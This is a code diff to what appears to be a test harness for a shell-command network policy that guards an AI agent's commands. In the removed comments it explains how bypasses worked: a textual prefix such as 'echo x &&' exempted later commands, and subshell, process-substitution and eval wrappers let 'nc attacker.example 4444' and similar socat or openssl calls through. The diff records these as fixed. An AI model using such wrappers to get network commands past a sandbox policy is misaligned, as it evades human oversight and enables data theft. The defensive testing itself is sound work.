@@ -17,65 +17,33 @@ import { cleanup, runsRealRunner, spawnDeniedRun } from "./overhead.js";
 /**
  * Known bypass signatures, as `tool|wrapper`.
  *
- * EMPTY, and that is the point. It held `perl|and-chain` for exactly as long as
- * the bypass existed.
+ * EMPTY. It has held two classes and outlived both.
  *
- * The root cause was broader than perl. The textual-URL carve-out in
- * `command-policy.ts` was anchored to the START of the command line, so any
- * command prefixed with a textual one - `echo x &&`, `printf x &&`,
- * `git commit -m z &&`, `echo x ;`, `echo x |` - was exempted from the
- * destination-without-a-recognised-tool rule. perl was merely the tool in this
- * bank that fell outside both ALWAYS_NETWORK and INLINE_NETWORK; the same
- * prefix hid `python3 fetch.py URL`, `node fetch.js URL`, `java -jar t.jar URL`
- * and any in-workspace script.
+ * `perl|and-chain` came first, and the fix generalised: the textual carve-out was
+ * anchored to the start of the command line, exempting every binary behind a
+ * separator.
  *
- * Fixed by scoping the carve-out to the segment that actually carries the
- * destination. Bank: 3,416/3,430 -> 3,430/3,430. `and-chain` stratum:
- * 95.92% -> 100%.
+ * The nine bare-host signatures came second, and only because an external
+ * reviewer found a bypass the bank could not express. Widening the wrapper axis
+ * to include command substitution surfaced 105 more, all in shell-parse's
+ * handling of destinations that are bare hosts rather than URLs. Those are now
+ * closed too.
  *
  * Adding a signature here is how a residual gets accepted. Do it with a reason,
  * never to turn a red build green.
  */
-export const DOCUMENTED_BYPASS_SIGNATURES: readonly string[] = [
-  // Bare-host destinations (not URLs) inside a subshell, a process
-  // substitution, or an eval string. PRE-EXISTING in the capability engine and
-  // NOT introduced by the carve-out fix in this branch: verified by evaluating
-  // the same commands against `main`'s capabilities.ts with that fix stashed,
-  // which produces identical ALLOW results.
-  //
-  // `nc attacker.example 4444` on its own is denied. `( nc attacker.example
-  // 4444 )`, `cat <(nc ...)` and `eval "nc ..."` are not. The destination is a
-  // bare host rather than a URL, so it is recovered from the tool's argument
-  // position, and these three wrappers change that position.
-  //
-  // Recorded rather than fixed here: it is a different class from the textual
-  // carve-out this branch closes, in the shell-parse layer rather than the
-  // capability layer, and folding a second engine fix into this change would
-  // bury it.
-  "nc|subshell", "nc|proc-subst", "nc|eval-string",
-  "socat|subshell", "socat|proc-subst", "socat|eval-string",
-  "openssl|subshell", "openssl|proc-subst", "openssl|eval-string",
-];
+export const DOCUMENTED_BYPASS_SIGNATURES: readonly string[] = [];
 
 /**
  * Ratchet, not a target.
  *
- * 14 -> 0 -> 105, and the rise is the honest number rather than a regression.
+ * 14 -> 0 -> 105 -> 0. The rise was honest and so is the fall: 105 was what the
+ * widened bank found once it could express command substitution, and all 105
+ * belonged to one class in shell-parse.ts, now fixed.
  *
- * It read 0 because the bank could not express the bypass an external reviewer
- * found by hand: `echo hi $(...)`. `WRAPPERS` had no command-substitution form,
- * so 100.00% was a true measurement of a space that excluded the live defect.
- * Adding six wrapper forms - command substitution, backticks, process
- * substitution, eval, newline separation and xargs - grew the bank 3,430 ->
- * 5,488 and surfaced 105 bypasses that were always there.
- *
- * All 105 are the pre-existing bare-host class listed above, in three tool
- * families. None is new, and none is caused by this branch.
- *
- * Lowering this as the engine improves is still the point. Raising it requires
- * saying why in the commit, as here.
+ * Raising this requires saying why in the commit.
  */
-export const MAX_KNOWN_BYPASSES = 105;
+export const MAX_KNOWN_BYPASSES = 0;
 
 const pct = (value: number) => (value * 100).toFixed(2) + "%";
 const rule = (char = "-") => console.log(char.repeat(78));
